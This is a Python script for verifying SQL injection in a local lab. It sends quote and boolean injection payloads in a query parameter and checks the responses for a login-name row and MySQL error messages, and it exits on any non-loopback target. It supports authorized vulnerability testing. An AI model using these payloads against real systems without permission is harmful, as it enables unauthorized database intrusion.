#!/usr/bin/env python3
# SQLI-001 local-lab HTTP verification draft (draft only, never executed)
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

LOOPBACK = {'localhost', '127.0.0.1', '::1'}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def load_cookie(path):
    if not path:
        return None
    pairs = []
    with open(path, 'r', encoding='utf-8') as handle:
        for line in handle:
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            name, value = line.split('=', 1)
            pairs.append(name.strip() + '=' + value.strip())
    return '; '.join(pairs) if pairs else None


def fetch(opener, url, cookie, timeout):
    request = urllib.request.Request(url, method='GET')
    if cookie:
        request.add_header('Cookie', cookie)
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.status, response.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')


def summarize(body):
    marker = 'Your Login name:'
    has_row = marker in body
    row_value = None
    if has_row:
        tail = body.split(marker, 1)[1].lstrip()
        row_value = tail.split('<', 1)[0].strip()[:64]
    errors = ['SQL syntax', 'error in your SQL', 'Warning: mysql', 'mysql_fetch']
    found = [item for item in errors if item.lower() in body.lower()]
    return {'has_login_row': has_row, 'row_value': row_value,
            'error_markers': found, 'length': len(body)}


def main():
    parser = argparse.ArgumentParser(description='SQLI-001 local-lab HTTP draft')
    parser.add_argument('--base-url', required=True)
    parser.add_argument('--path', required=True)
    parser.add_argument('--param', default='id')
    parser.add_argument('--normal-value', default='1')
    parser.add_argument('--test-value', action='append', default=[])
    parser.add_argument('--cookie-file')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.base_url)
    host = (parsed.hostname or '').lower()
    if parsed.scheme not in ('http', 'https') or host not in LOOPBACK:
        sys.exit('refuse non-loopback target')

    opener = urllib.request.build_opener(NoRedirect)
    cookie = load_cookie(args.cookie_file)
    endpoint = parsed.scheme + '://' + parsed.netloc + args.path
    cases = [('normal', args.normal_value)]
    for value in (args.test_value or ["1'", "1' AND '1'='1", "1' AND '1'='2"]):
        cases.append(('test', value))

    report = []
    for label, value in cases:
        query = urllib.parse.urlencode({args.param: value})
        url = endpoint + '?' + query
        try:
            status, body = fetch(opener, url, cookie, args.timeout)
        except urllib.error.URLError as exc:
            report.append({'case': label, 'value': value, 'error': str(exc.reason)})
            continue
        except OSError as exc:
            report.append({'case': label, 'value': value, 'error': str(exc)})
            continue
        item = {'case': label, 'value': value, 'status': status}
        item.update(summarize(body))
        report.append(item)

    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == '__main__':
    main()